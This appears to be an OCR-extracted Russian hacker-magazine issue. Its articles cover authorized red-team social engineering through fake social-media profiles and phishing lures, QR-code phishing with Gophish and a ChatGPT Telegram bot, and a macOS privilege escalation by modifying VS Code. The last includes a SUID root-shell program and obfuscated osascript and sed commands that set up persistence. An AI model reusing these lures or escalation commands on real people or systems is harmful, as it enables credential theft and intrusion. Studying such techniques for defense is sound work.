в поле отправите ля, а насколько сложно пользователю опре делить отпра-
вителя письма в интерфейсе.
   Название компаний указывать не буду, но веб-интерфейсы с явными
проблемами определе ния реаль ного отправителя письма мы рас смотрим.
На при мере ниже ты можешь увидеть email в поле «От», но это не адрес
отправителя — это email, указанный вмес то име ни отправите ля.





  Письмо в веб-интерфей се, где не виден реальный email-адрес отпра-
  вителя

То есть имя и email могут выг лядеть так: info@domain.ru <info@evil.com>,
а в почтовом сер висе жертва видит только <info@domain.ru>.
  В следующем при мере похожая исто рия: вместо имени мы видим email
и поль зователь решит, что письмо пришло от зна комо го отправите ля.





Но в этом интерфейсе при нажатии на email хотя бы можно увидеть, кто
на самом деле отправил письмо, в отличие от предыдущего примера. Мож но
же сделать так, как в интерфейсах ниже?





     Пример отображения имени отправителя и email в Яндекс Почте





        Пример отоб ражения имени отправителя и email в The Bat


ÈÒÎÃÈ

Мы рассмот рели несколько при емов обхода «человечес кого файрвола»
с помощью технических приемов и недоче тов в ПО. Разуме ется, сколько
существует программ и сервисов, столь ко в них будет и недочетов, требуется
лишь усердие при поиске «обхода системы». Собственно, профес сия хакера,
в нашем слу чае белого, как раз и под разуме вает, что ты смотришь на мир
немного не так, как все остальные.
COVERSTORY





        КАК СОЦИАЛЬНЫЕ СЕТИ
        ПОМОГАЮТ ХАКЕРАМ





При  пентестах  социальные  сети  часто
обхо дят стороной — они считаются личным
пространс твом     поль зователя.    Тем
не менее для зло умыш ленни ков соци аль-
ные  сети —  незаменимый  источник         Юрий Другач                                                                                     Автор книги о социальной
информа ции. Сегод ня мы погово рим о том,      инженерии «Контролируемый                                                                                              взлом»
как  пентестеры  могут  использовать  их
в своей работе.




                        Статья имеет озна комительный характер и пред-
                       назна чена для специалис тов по безопас ности,
                      про водящих тестирова ние в рамках контракта.
                       Автор  и  редак ция  не  несут  ответс твенности
                        за любой вред, причинен ный с применением
                       изложенной информа ции. Распространение вре-
                      донос ных прог рамм, наруше ние работы систем
                      и  нарушение  тайны  переписки  прес ледуются
                      по закону.


Зачем злоумышленнику ата ковать сотрудника в социальной сети?
 • Сот рудник может отправить «коллеге» кон фиденциальную информацию.
 • Злоумышленник может получить доступ к личному телефону или компь юте-
   ру сотрудни ка. Если на устрой стве есть VPN, который подклю чается к сети
   организации, считай, что злоумыш ленник уже «гуляет» по кор поративному
   серверу или рассыла ет фишинговые пись ма другим сотрудникам.
 • Если в организа ции слабая парольная политика, то сот рудник будет
   исполь зовать одинаковый или схожий пароль к соцсети и к ресурсам орга-
   низа ции.

Вот такое сообщение может прис лать злоумышленник, что бы пре одолеть
двух факторную  аутентификацию,  использующую  автоматический  звонок
как второй фак тор.





              При мер сооб щения от зло умыш ленника

При веденный выше пример, конечно, не для корпоративного мира, а для
прос тых граждан, но он может пригодиться, когда нужно пройти такой вид
аутентификации в корпоративном ПО.


ÏÎÄÃÎÒÎÂÊÀ

Пе ред тем как проверять осведомленность сотрудни ка в соцсети, нам, конеч-
но, понадобится аккаунт в ней (ско рее даже несколь ко). Акка унт можно соз-
дать или купить (пишешь в поисковике «купить аккаунт в  ...»). Только
не покупай «лом» (взло манный акка унт), за угнанные акка унты по голове
не погладят даже при использовании в закон ном пентесте.
   Потребу ются жен ские акка унты, неважно, какого пола наша цель. В боль-
шинстве случаев нашему фейку должно быть около 35–45 лет. Эро тических
фото размещать не надо. Обыч ная жен щина.
  Фо тографию на ава тар ку генери руем с помощью нейронных сетей на сай-
те thispersondoesnotexist.com. Результат генерации, как правило, выглядит
довольно реалис тичным.





             При меры сгенерированной «фотографии»

С использовани ем такой фотографии соц сеть автоматичес ки не забанит тебя
за воровство фото из других акка унтов. Остальные фотографии берем
с людьми, но без лиц. Трех-пяти снимков будет достаточно. Для получе ния
уни кальных фото отлично подойдут скрин шоты из видео.
  Подписывать фотографии важно «по-человечес ки», эмоциональ но, чтобы
создавалось впе чатление,  что они не фей ковые. Непрофес сиональные
фотог рафии природы тоже подой дут, но не забываем о подписях, например
«Зима в разгаре».





          Пример бытовой непрофес сиональной фотографии

Заполняем остальные поля в профиле по нас троению: школа, вуз и так далее.
Место работы не пишем, но можно написать, что ты HR, если собира ешься
общаться с жертвами в этой роли.
   Если ты создал аккаунт с нуля, нуж но добавить ему «историю». На стене
должны быть какие-то записи в прошед шем времени. В «запрещенной в Рос-
сии соц сети» лег че все го создать себе аккаунт десятилет ней давности. Алго-
ритм дей ствий очень простой.
  Публикуем пост с настройкой видимости «Только я».





                При мер настройки видимос ти поста

Жмем на расположенную справа кнопку вызова меню и меняем дату
на три-четыре года назад.





                 Из менение даты публикации пос та

Размещаем таким образом 8–10 пос тов.
   Те перь нуж но «набить» дру зей в аккаунт. Кто у нас любит знакомиться
с новыми людьми, даже если не знает их? Пра вильно, участники соот ветс тву-
ющих темати ческих групп.




                   По иск темати ческих групп

Добав ляем ся в первую попавшуюся группу и в разделе «Участни ки» видим
десятки тысяч наших потенциальных дру зей. Открываем их профили и нап-
рашиваемся в друзья к 20–30 людям. Как только тебя добавит несколько
человек, иди к ним в профили в раздел «Друзья» и отправляй заявки в друзья
их друзьям (как мно го слов «друзья» в одном предложении, но что поделать,
дальше будет еще больше).
  Лю ди, которым будут приходить твои заяв ки, увидят, что у вас есть общий
друг, и с большей вероятностью добавят тебя в свой круг общения. Спус тя
час я таким способом набирал по 500–600 человек.
  Но для наших целей дос таточно и 100–200 человек. Что бы облегчить старт
рас крутки, можно купить аккаунт с друзьями. Стоит он около 40–50 рублей,
а в друзьях уже будет 50–100 профилей.
   Те перь нуж но добав лять целевых дру зей. Для этого ищем людей по наз-
ванию организации.





         При мер поиска сот рудников какой-либо организации

Добав ляем человек десять, не больше, и ждем, ког да нас при мут в друзья.
Теперь отправ ляем заявки всем остальным, кого мы смогли найти. Доверия
к нашему про филю будет больше, если у нас в друзьях уже числится коллега
из организации жертвы. Если сотрудни ков таким способом нашлось немного,
при дется идти в другие соцсети и искать людей там.





               При мер поиска орга низации в LinkedIn

На стра нице организации видим список сотрудников и пытаемся найти их
в основной соци альной сети, чтобы добавить в друзья.
  А еще совсем нехороший человек может стать SMM-рей дером, то есть
присвоить себе груп пу в LinkedIn, у которой пока нет вла дель ца (см. скрин шот
ниже), но сей час не об этом.





     Пример сообщения на странице банка, у которой нет вла дель ца

Итак, мы «под ружились» с сот рудниками организации, которая заказала нам
пентест. Приступим к написанию сообщений. Если ты не уверен, что человек
работа ет в целевой орга низации, — это отличный повод начать общение (на
самом деле даже если он там работа ет).
  Делаем «мно гоходовку» и пишем прос тое именное сообщение:


          «..., äîáðûé äåíü. Âû åùå ðàáîòà åòå â ...?»                »«
Ответ, как правило, укладывается в один из трех вариантов: да, нет, а что?
   Если ответ утверди тельный, пишем: «Жаль, конечно, в хорошем смысле,
но ладно, успе хов Вам!» Жертве станет любопытно, и она опять же спросит:
«А что?»
   Го ворим: «Так как речь идет о работе, я не хочу, чтобы меня обвиняли
в переманивании, поэтому вы можете озна комиться с информа цией в откры-
том дос тупе самостоятельно (тут ссылка на фишинговую форму авторизации
в соцсети). Только, если что, Вы нашли ее случай но :)».
   Если мы нацелены получить доступ к телефону или компьютеру жертвы, то
предлагаем отправить файл: «Так как речь идет о работе, я не хочу, чтобы
меня обви няли в каком-то там переманивании. Но если Вам интерес на
работа по специальности, с более высокой зар платой и действи тельно адек-
ватным руководите лем, я могу отправить файл на Вашу личную почту».
Или делаем другое окончание: «...и действи тель но адекватным руководите-
лем, то прикрепляю небольшую анкету».
   Ну и пос ле это го отправляем потенциальной жертве документ с макросом
или фишин говую ссылку. Если на пер воначаль ный вопрос жер тва пишет
«Нет», вычеркиваем челове ка из нашего рабочего списка, так как нам за таких
не платят.





 • Название   фай ла   или   ссылки   может   включать   220000p
   или 220tysyachRub — так мы дадим понять, что деньги предлагаются
   хорошие.
 • Начинать  сообщение  с  «Доб рый  день  (утро,  вечер)»  лучше,  чем
   со «Здравствуйте», кон версия обычно зна чительно выше.
 • В рабочее время сотрудник, скорее все го, будет заходить в соцсеть
   с телефона, учти это при планировании ата ки.
 • В зависимости от тек ста сообщения можно отправить сотруднику не прос-
   то ссылку или файл c макросом, но и .apk, якобы специально созданное
   для соискателей закрытое при ложение, в котором нужно разрешить
   геоло кацию, авто ризо ваться в Gmail, дать доступ к СМС и так далее.




Î ÏÎÈÑÊÅ ÑÎÒÐÓÄÍÈÊÎÂ Â ÑÎÖÑÅÒßÕ

Можно искать сот рудни ков не только стан дартным поис ком в соцсетях, но и
через страницы ком пании. Например, в «запрещен ной соцсети» нужно смот-
реть, кто лайкает пос ты на этой странице. Если один человек лай кнул нес-
колько постов (особенно когда лайков под постами два-три), с большой
долей веро ятности можно сказать, что это сотрудник организации. Но при
таргетирован ной социальной инженерии име ет смысл уточ нить эту информа-
цию по другим источникам, поскольку этот лайкающий, может быть, просто
хочет устро ить ся в ком панию на работу.
   Как искать сот рудников в VK? Если крат ко, то идем на специальную стра-
ницу и вби ваем название интересующего нас работо дате ля в поиск.





Ну а LinkedIn прос то создан для поиска сот рудников в опре деленных ком-
пани ях. Он заб локирован в РФ, одна ко люди как-то продолжают им поль-
зоваться :)





ÊËÎÍÈÐÎÂÀÍÈÅ ÀÊÊÀÓÍÒÎÂ

Вновь созданный аккаунт будет вызывать боль ше доверия, если это фей-
ковый профиль коллеги, дру га, знакомого потенциальной жертвы. Соз давая
фейковую копию аккаунта коллеги, используй подмену символов.
   Как мошенники в Telegram создают копии извес тных групп и профилей, так
и ты можешь исполь зовать этот при ем, когда ука зываешь имя аккаунта, —
в бла гих целях, разуме ется.
  Нап ример, мошенники в своих «методичках» именно так и рекомендуют
пос тупать в извес тной соцсети с фотог рафиями, например вместо точ ки
использовать нижнее подчеркивание и наоборот: скажем, yu.ra вместо yu_ra.
Не забываем и про клас сический тайпсквот тинг, когда символы заменя ют
похожими или добавляют лиш ние, например valeron меня ем на valer0n.
   Если поль зователь вдруг заметит подвох и спросит, почему ты пишешь
с нового аккаунта, скажи, что ты потерял дос туп к ста рому, а вос становить его
не получа ется.


ÌÅÄËÅÍÍÎ, ÍÎ ÂÅÐÍÎ

По чаще лайкай и комменти руй посты на стра нице или в группе организации.
Нуж но примелькаться, пусть тебя заметят пять — десять сотрудников. Успех
можно оце нить по лайкам и комментариям тво их комментариев.
  Дож дись момен та, ког да тебя попросят о помощи или зададут вопрос.
Вместо отве та предложи ски нуть требуемое на почту (в иде але корпоратив-
ную) и отправь потен циальной жер тве нагрузку. В общем, лучшие сце-
нарии — это когда пользователь сам ини циирует отправ ку ему ссыл ки
или файла. На иллюстрации ниже приведен наг лядный пример такого.





ÌÍÎÃÎÕÎÄÎÂÊÀ Â ÑÎÖÑÅÒÈ

По рой удив ляешься совершенно фантастическим сце нариям, которые при-
меня ют соци альные инженеры в дикой природе. Вот пример «многоходовки»,
когда иранские хакеры маскировались под инструк тора по аэробике. Больше
восемнадцати месяцев они работали через сеть ботов в Fb и по email (см.
рис. ниже), общаясь с работниками воздушно-кос мической обороны США.
Осо бенно хакеров интересо вали те, кто участву ет в опе рациях на Ближнем
Востоке.





  При мер письма от иран ского хакера с опро сом для жертвы о ее питании

«Хакер» уже публиковал статью под названием «Иранские хакеры маскирова-
лись под инструктора по аэробике», под робно описывающую этот инцидент.
   У тебя может и не оказать ся нескольких месяцев на тесты, но не всегда
нуж но торопиться. Ведь если сотрудники привыкают к «быстрым» методам
атак, то слож ную многоходов ку разгадать нам ного труднее. Если ты состоишь
в Red Team и регулярно ищешь лазейки в целевой организации, то дол гоиг-
рающие ата ки — это правиль ный подход.


ÏÎÌÎÙÜ ÏÎ ÇÀÏÐÎÑÓ

Нельзя не упо мянуть и про тактику выжидания. Поз накомив шись с поль-
зователем в социальной сети, дож дись, пока он сам не напишет в своем пос-
те просьбу о помощи (или уже написал, внимательно изучи ленту).
  Вос пользовав шись этим поводом, можно отпра вить потенциальной жер-
тве не только вре доносный архив, но и фишин говую ссылку на сайт, где якобы
рас крывается ответ на ее воп рос. Сайтом может быть и социальная сеть,
в которой ты общаешься с жертвой.





ÂÛÂÎÄÛ

Социаль ная инженерия в связке с соци альными сетями — мощный инстру-
мент как для белых хакеров, так и для зло умышленников. Чем быс трее мы
най дем неосведомленных в сфере информа цион ной безопас ности сот рудни-
ков, тем лучше. Ведь рано или поз дно навыки пользовате лей обя зательно
кто-нибудь про верит — либо ты, либо хакер.
COVERSTORY





       ВЫМАНИВАЕМ ПАРОЛЬ
       ПРИ ПОМОЩИ QR-КОДА
           И ЧАТ-БОТА





ChatGPT сейчас разве что в котлеты не кладут. В этой статье
мы расска жем, как в про екте по социальной инженерии
с помощью форка библиотеки для Gophish рассылать QR-
коды вмес то обыч ных ссылок, чтобы вытащить сотрудников
из защищенного рабочего окружения на личные девай сы.
В  качес тве  catchy-сце нария  рассылки мы  рассмотрим
«Telegram-бот IT-поддер жки с ChatGPT» и на самом деле
используем эту нейросеть для генерации кода бота, а так же
подключим интегра цию с API OpenAI для общения с поль-
зователями.




В августе 2023 года прош ла церемония награжде ния Pentest Award — премии
для спе циалистов по тестированию на про никновение, которую учре дила
ком пания Awillix. Мы пуб ликуем лучшие работы из каж дой номина ции. Эта
статья заняла первое место в номина ции «Ловись, рыбка», посвященной
фишин гу.





 • Идея, сценарии: Ñåðãåé Ëóêèíûõ, @IBcrew
 • Инфраструктура,  домены,  почта,  Gophish:  Èëüÿ  Ãåîðãèåâñêèé,
   @igeorgievsky
 • Код для QR и чат-бота: Äìèòðèé Ìàðþø êèí, @dmarushkin





ÇÀÄÀ×À

На входе задача — сделать проект по социаль ной инженерии в крупной
финансовой организации с целью повышения осведомленности сотрудников
в области информацион ной безопас ности.
  Известно, что у сот рудников заказ чика корпоративный Outlook, антиспам
и Chrome как дефол тный браузер. А также повышенный уровень социальной
ответственности и боевой готовности — как у ИБ-подразде ления, так и у
рядовых слу жащих.
  Из при вычных инс трумен тов будем использовать опенсор сный фрей мворк
Gophish. Попыта емся вытянуть пользователя по ссыл ке на внеш ний ресурс
с доменом, похожим на корпоративный, и формой логина, а потом поп росить
ввести учет ные данные.


ÏÐÎÁËÅÌÛ

Что может пойти не так с рассылкой:
 • Антиспам может сре зать пись мам бал лы за некачественно настроенный
   почтовый домен (DKIM, Dmark, вот это всё), недавно зарегис трированный
   домен,  подоз рительные  хедеры  (при вет,  дефолтный  X-Mailer:
  gophish) и оби лие ссы лок в письме (ссылка на фор му авториза ции с RID-
   меткой и ссылка на картинку в письме, по числу загрузок которой изме-
   ряется про цент откры тия писем).
 • Chrome на рабочих хостах пользователей при переходе по ссыл кам
   из писем на све жий домен может с большой вероятностью показать крас-
  ную простыню, что явно умень шит конверсию из перешедших по ссылкам
   в тех, кто ввел пароль.

С настройкой почтового домена, вре менем пос ле регис трации домена
и хедерами все относительно прос то: при желании можно нас троить
и затюнить, а ссылку на картинку вооб ще убрать — кор поративный Outlook
все рав но ее не отоб разит в письме от внеш него отправителя.
  Но как уйти от внешней ссылки на форму в письме и вне запной паранойи
браузе ра?


ÐÅØÅÍÈÅ

По чему бы нам не увес ти пользователя из защищенного рабоче го окружения
на фишинговый ресурс, открытый на личном девайсе, предложив ему в пись-
ме QR-код?
   Тут мы, кажет ся, убиваем сра зу двух зай цев: и антиспам немного рассла-
бится, так как у него нет понижающего score фак тора с внешними ссылками
в письме, и браузер на личном телефоне не скло нен, в отли чие от десктоп ной
версии Chrome, так паниковать при виде нового домена.
  Но как вставить QR в пись мо? Это же тоже картинка, и корпоративный
Outlook пожрет ее в сообщениях от внеш него отправителя так же, как кар-
тинку Gophish.
   Тот же Яндекс рассылает QR-ссылки на чеки, сверстанные при помощи
слоев (div).





Второй вариант — сде лать QR-код из сим волов Unicode.





Попробуем затащить в Gophish оба варианта и пос мотрим, что будет лучше
выглядеть в Outlook.
  Для этого сначала принесем в библиоте ку go-qrcode, которая часто
используется для работы с QR в Go, два новых метода для генерации QR
в Unicode и HTML.





Дальше в Gophish до бавим генера цию QR-ссылки в переменную для поч-
тового шаблона.





В ходе пусконаладоч ных испы таний мы выяви ли, что для Outlook корректней
отображение в Unicode, а для веб-клиентов (Gmail, Mail.ru, Yandex) и мобиль-
ных кли ентов лучше выг лядит HTML QR.
  В рассылке можно под держать сразу оба вари анта через сле дующую
конструк цию.





Мы получили рабочий способ пробросить QR со ссылкой в письмо. Смар-
тфон без вопросов его читает и открывает нам веб-форму авториза ции
Gophish без намеков на беспокойство. Ура!


ÑÖÅÍÀÐÈÉ ÐÀÑÑÛËÊÈ

Итак, у нас есть новый велосипед, куда бы нам на нем поехать?
  Нам нужен прав доподобный предлог для пользовате ля, чтобы у него воз-
никло желание сканировать QR-код со смартфо на и там же ввести свои учет-
ные данные.
   Когда мы работали над проектом, из каждого утюга рас сказывали о все
новых нишах для применения ChatGPT. Почему бы не обыграть его и у нас?
Так родился сценарий про верки сот рудни ков «Новый Telegram-бот IT-под-
держки сот рудников с ChatGPT».





Письмо также содержало примеры работы с ботом (выбрали реаль ные отве-
ты ChatGPT) и сообщение о подарках для первых зарегис трировав шихся.





И раз уж мы исполь зуем в сценарии ChatGPT, почему бы сам код с логикой
для бота не написать именно ему? За пару часов, десяток запросов и уточ-
нений мы получили впол не рабочий код бота.
  Он принимает пользователя по ссыл ке из пись ма с RID-меткой и просит
авто ризо ваться по ссылке на форму.





Пос ле перехо да на веб-форму авто ризации сотруднику пред лагалось ввес ти
свою кор поративную поч ту и пароль.





Пос ле ввода реквизитов пользователь возвра щается к боту. Собранные рек-
визиты сот рудни ков сохранялись на нашем сервере.
  После авторизации (и толь ко после) бот ловил callback от формы Gophish
и оста вался общать ся с пользовате лем в заданной нами роли бота IT-под-
держки организации.





API OpenAI кор рек тно воспри нял задан ный стартовый ввод («Ты веселый бот
IT-под держки сотрудни ков банка Х, рас положен ного в Y») и дальше выдавал
вполне релевантные ответы попавшимся на рассылку сотрудни кам.





ÂÛÂÎÄÛ

Итак, мы научили Gophish фор мировать тексто вые QR-ссылки с помощью
Unicode-символов и элементов div, выяснили, что для корпоративного
Outlook луч ше всего подошли имен но QR-коды в Unicode.
  Далее, чтобы объяснить необ ходимость перей ти со смартфона по QR-
ссылке, мы выбрали сценарий «Telegram-бот IT-под держки с ChatGPT» и с
помощью этой же нейросети написа ли пол нофункци онального бота IT-под-
держки, исполь зовав API OpenAI. Задав боту минимальный стартовый кон-
текст об организации, мы научи ли его давать релеван тные отве ты об адресах
и телефонах офисов, а подняв боту уровень юмо ра, смогли добить ся вирус-
ного эффекта. Такой бот может привлечь даже сотрудников, не включенных
в рассылку.
  Наш кли ент получил новый инстру мент для обу чения сотрудни ков бдитель-
ности, что должно помочь защитить их от набира ющих популярность фишин-
говых атак в мессендже рах. Отдельный челлендж для клиента — раз работать
механизмы обнаруже ния сценариев, при которых сот рудники переключаются
на личные устрой ства.




                     На GitHub одного из авторов ты найдешь ис-
                      ходные коды форка биб лиотеки go-qrcode с под-
                      держкой QR-кодов в виде тегов HTML и символов
                       Unicode и исходные коды бота для Telegram.
COVERSTORY





    ЗЛОУПОТРЕБЛЯЕМ УСТАНОВКОЙ
       VS CODE ДЛЯ ЛОКАЛЬНОГО
     ПОВЫШЕНИЯ ПРИВИЛЕГИЙ



Когда тебе нужно заставить сотрудников
тех поддержки выдать кре ды и привилегии
в macOS, но так, чтобы они при этом ничего
не заподоз рили, можно сме ло предлагать
завершить  установ ку  легитимного  ПО,           sn   vvcr  sh                                                                                                               Sr. Penetration Tester, Red
которое  ты  предварительно  кастомизи-            Team Operator                                                                                                 ppn.snovvcrash.rocks
ровал. Для примера раз берем, как это сде-
лать с любимым всеми Visual Studio Code.




В августе 2023 года прош ла церемония награжде ния Pentest Award — премии
для спе циалистов по тестированию на про никновение, которую учре дила
ком пания Awillix. Мы пуб ликуем лучшие работы из каж дой номина ции. Эта
статья заняла третье место в номина ции «Ловись, рыб ка», посвященной
фишин гу.


Этот спо соб мы примени ли по заказу одно го î÷åíü крупного российского
холдинга  в  ходе ком плексной операции Red  Team.  Заказчик настоял
на реали зации сле дующе го сценария: нас «устра ивают» в компанию по сог-
ласованной легенде как внеш них сот рудни ков на удаленке с выданным
MacBook в качестве рабочего ноута.
   Так как при виле гии обычных сотрудников на «маках» в организации сильно
уре заны, обращения к тех поддержке по боль шей час ти сос тоят из писем вро-
де «админ, помоги мне установить такую-то программу». Из это го родилась
идея вос пользоваться этой осо бенностью рабоче го процесса для повыше-
ния при виле гий на «маке» до рута и заполучить служебную учетку из /etc/
krb5.keytab для развития дальнейших атак на AD.


ÑÏÓÔÈÌ ÄÈÀËÎÃ ÀÓÒÅÍÒÈÔÈÊÀÖÈÈ

В паблике есть мануал по написа нию вредонос ного рас ширения, которое
уме ет само стар товать при запуске VS Code и све тить назойливым окном
в глаза ненавис тному админу, клянча его пароль.





Достоинство это го метода в том, что можно получить креды привилегирован-
ной учетки в откры том виде. Расширение пишется в пользовательскую дирек-
торию ~/.vscode, поэтому, даже если у адми на сто ит чистый VS Code, запуск
модульного окна сох ранится.
  Недостаток в том, что надо поймать î÷åíü уставше го адми на, чтобы пред-
при ятие взлетело, — диало говое окно рисуется с помощью AppleScript,
поэтому выг лядит весьма халтурно и серь езно отличает ся от встроенных окон
запроса расширенных при виле гий. В связи с этим мы решили найти другой
спо соб абьюзить VS Code.


ÌÎÄÈÔÈÖÈÐÓÅÌ VS CODE

Несмотря на то что VS Code можно запускать с при вилегиями поль зователя,
внутри есть дополнительные фун кции, которые тре буют прав админис тра-
тора. Нап ример, интеграция команды code в консоль (для этого вносятся
изме нения  в  сис темный  PATH). В VS Code  это  делается  командой
из Command Palette (Command-Shift-P).
   Хо тя разработ чики Code настоятель но не рекомендуют изменять встро-
енные системные команды, хакеры любят жить опас но, поэтому способ есть.





Грепнув каталог с VS Code по строке command in PATH, найдем отсылку к JS-
функции installCommandLine:



  $ pwd
  /Applications/Visual Studio Code.app


  $ grep -r 'command in PATH'
  ./Contents/Resources/app/out/vs/workbench/workbench.desktop.main.js:...
  class S extends I.Action2{constructor()
  {super({id:"workbench.action.installCommandLine",title:{value:
  (0,t.localize)(1,null,L.default.applicationName),original:Install  '${L.
  default.applicationName}' command in PATH} ...


Далее, грепнув по installCommandLine, найдем само тело исполняемой
коман ды.



  $ grep -r 'installShellCommand'
  ./Contents/Resources/app/out/vs/code/electron-main/main.js:... async
  installShellCommand(T){const{source:U,target:H}=await
  this.n();try{const{symbolicLink:re}=await
  p.SymlinkSupport.stat(U);if(re&&!re.dangling){const
  Y=await(0,u.realpath) (U);if(H===Y)return}await
  p.Promises.unlink(U)}catch(re){if(re.code!=="ENOENT")throw re}try{await
  p.Promises.symlink(H,U)}catch(re)
  {if(re.code!=="EACCES"&&re.code!=="ENOENT")throw
  re;const{response:Y}=await this.showMessageBox(T,{type:"info",message:
  (0,y.localize) (0,null,this.h.nameShort),buttons:[(0,y.localize)
  (1,null),(0,y.localize)(2,null)]});if(Y===0)try{const ne=osascript -e
  "do shell script \"mkdir -p /usr/local/bin && ln -sf '${H}' '${U}'\"
  with administrator privileges";await(0,O.promisify)(E.exec)
  (ne)}catch{throw new Error((0,y.localize)(3,null,U))}}} ...


Как видишь, ничто не мешает нам добавить собствен ное действие к команде
osascript, но надо придумать, что именно мы можем сде лать для сох-
ранения и пос ледующе го восста новления привилегированного доступа.


osascript -e "do shell script \"mkdir -p /usr/local/bin \
&& ln -sf '${H}' '${U}'\" with administrator privileges"

Курс Oﬀensive Security «EXP-312: Advanced macOS Control Bypasses» пред-
лагает изменить настройки PAM-модуля (а именно перечня обя зательных
критери ев при аутентифика ции через sudo), чтобы имперсониро вать root
без пароля. Это делается с помощью изме нения файла нас троек /etc/pam.
d/sudo.





К сожале нию, этот способ не взлетел в macOS 13.2.1, поскольку теперь
недос таточ но быть рутом, чтобы менять содер жимое чувс твительных фай лов
на диске (все, что связано с кредами и аутен тификацией). Для этого у про-
цесса, который зап рашивает такие изменения, должна быть привиле гия Full
Disk Access, которая навешивается только через GUI.
  Мы решили пойти дедов ским способом и соз дать SUID-бинарь (благо хоть
это на «маке» работа ет):


// gcc -o suidshell suidshell.c
// ./suidshell root
#include <stdlib.h>
#include <sys/types.h>
#include <pwd.h>
#include <unistd.h>
void change_to_user(const char *szUserName)
{
 struct passwd *pw;
 pw = getpwnam(szUserName);
 if (pw != NULL)
 {
 uid_t uid = pw->pw_uid;
 if (setuid(uid) == 0) system("/bin/bash -p");
 }
}
int main(int argc, char **argv)
{
 if (argc == 1) return 1;
 for (int i = 1; i < argc; i++) change_to_user(argv[i]);
 return 0;
}

Те перь можно добавить веселые команды к кус ку кода, нагрепанному выше,
чтобы навесить нуж ного владельца и SUID-бит на шелл:


osascript -e "do shell script \"chown root:wheel /tmp/suidshell \
&& chmod u+s /tmp/suidshell \
&& mkdir -p /usr/local/bin && ln -sf  '${H}' '${U}'\" with
administrator privileges"

Еще немного покопавшись, мы откры ли дру гую интересную возможность —
вместо  того  что бы  класть  SUID-бинарь  на  диск  непос редственно
перед фишингом, мож но добавить команды выше к задаче /etc/periodic/
daily/110.clean-tmps, которая выполняется ежедневно:


sed -i '' -e 's/exit \$rc/chown root:wheel \/tmp\/\suidshell \&\&
chmod u+s \/tmp\/\suidshell\nexit \$rc/' /etc/periodic/daily/110.
clean-tmps


osascript -e "do shell script \" echo
c2VkIC1pICcnIC1lICdzL2V4aXQgXCRyYy9jaG93biByb290OndoZWVsIFwvdG1wXC9cc
3VpZHNoZWxsIFwmXCYgY2htb2QgdStzIFwvdG1wXC9cc3VpZHNoZWxsXG5leGl0IF
wkcmMvJyAvZXRjL3BlcmlvZGljL2RhaWx5LzExMC5jbGVhbi10bXBz | base64 -d |
sh && mkdir -p /usr/local/bin && ln -sf '${H}' '${U}'\" with
administrator privileges"

Так можно дифферен цировать ход LPE: сна чала отредактировать запус-
каемую по расписанию задачу, а потом принес ти SUID-шелл и дожидаться
его повыше ния.





                 До выпол нения скам-команды





                  Вы полнение скам-коман ды





                 После выполнения скам-команды

В результате получаем нативное диалоговое окно для запроса повыше ния
при виле гий. Пожалуй, это перевешива ет все недостатки. Какие? Увы, так
нельзя утащить пароль админа в виде тек ста, к тому же нуж но класть на диск
дополнительный бинарь, что может выз вать сра баты вание мониторинга, если
он использует ся. И конечно, если админ притащит свой экземпляр VS Code,
жмем F to pay respects.


ÂÛÂÎÄ

При кинув шись бес помощным юзером, полностью находя щимся во власти
все могу щего адми на (то есть сотрудни ка техподдержки), можно чужими
руками «бесплатно» повысить себе локальные при виле гии на мак буке
и потенциально разжить ся дополнительными доступами. GGWP!
ВЗЛОМ





      ИСПОЛЬЗУЕМ ХАРДВЕРНЫЕ
           БРЕЙК-ПОЙНТЫ
       В ПЕНТЕСТЕРСКИХ ЦЕЛЯХ





Windows предос тавляет мощ ные инстру-
мен ты для уста нов ки точек останова непос-
редс твен но в памяти. Но зна ешь ли ты, что
с их помощью можно ставить и снимать
хуки, а также получать сисколы? В этой         MichelleVermishelle                                                                                       @Michaelzhm
статье я в подробностях рас скажу, как это        michael.zhmailo@yandex.ru
делать.


Точ ки останова служат для контроля выполнения программы и, конечно же, их
остановки  в  опре деленный  момент.  Гло бально  сущес твует  два  вида
брейк-пойнтов: software breakpoints и hardware breakpoints.
   Software breakpoint — точка оста нова, которая ста вится с помощью
отладчика или IDE. Чтобы поставить такую точку оста нова, можно, например,
прос то кликнуть на нужную строку программы в Visual Studio.





               Установка software breakpoint в Visual Studio

Такие точ ки оста нова можно ста вить где угодно и сколько угод но. Никаких
огра ниче ний нет.





                Установка множества software breakpoint

Hardware breakpoint — уже более сложная штука, которую мы сегодня и будем
изучать. Эти бря ки ставятся путем заполнения специальных отладочных
регистров процессора (DR0–DR7). Согласно докумен тации, Dr0–3 дол жны
хранить адрес, по которому установ лен breakpoint, но у меня бряк срабаты-
вал, толь ко если адрес заполнялся в DR0.
  Первые три регис тра называ ются регистра ми с отладочными адре сами
(Debug Address Registers). Регистры с номерами 4 и 5 не исполь зуют ся
и называются зарезервированными  отладочными регистрами  (Reserved
Debug Registers). DR6 содержит раз личную информацию о сработавшем
исклю чении. Исклю чение — это событие, воз никающее, когда компьютер
пытается  выполнить  инструкцию,  адрес  которой  расположен  в  DR0.
DR7 содержит биты управления отладкой. Если значение равно единице, то
точка останова дол жна сработать, если нулю, то не должна.
   Hardware breakpoints, как ты понимаешь, через красивый GUI не ставят ся.
Нам пот ребуется взаимо действовать с регис трами напрямую, используя,
конечно же, наш любимый WinAPI. И само собой, только хардверные брейки
позволят хукать, обхо дить AMSI и получать сис колы. Софтверные, к сожале-
нию, для это го не под ходят.


ÎÁÐÀÁÎÒÊÀ ÈÑÊËÞ×ÅÍÈÉ

Итак, исключение возникает при попытке выпол нить инструк цию, на которой
стоит точка останова. По сво ей натуре оно при этом точно такое же, как,
к при меру, при попытке деления на ноль.





                       Как выглядит исклю чение

Любые исключения могут быть обработа ны. Здесь есть два пути — VEH
(Vectored Exception Handling) и SEH (Structured Exception Handling). Отдель но я
выделю еще UEH (Unhandled Exception Handling). Начнем с SEH. SEH — стан-
дартный блок __try — __finally, __try — __except.


#include <iostream>
#include <Windows.h>
int main() {
 int a = 2 - 2;
 int b = 3;
 __try {
  std::cout << b / a << std::endl;
 }
 __except (EXCEPTION_EXECUTE_HANDLER) {
  std::cout << "EXCEPTION" << std::endl;
 }
 return 0;
}





             Обработка исклю чения с помощью SEH

SEH можно считать надстрой кой над конструкцией try — except из С++. В SEH
в  блок __except добавляют ся  спе циальные  зна чения,  в  зависимос ти
от которых может менять ся поведение обработ чика исключений:
 • EXCEPTION_EXECUTE_HANDLER — система передает управление в обра-
   ботчик исклю чения. То есть будет поведе ние, как в коде выше;
 • EXCEPTION_CONTINUE_SEARCH — эта конструкция зас тавляет систему
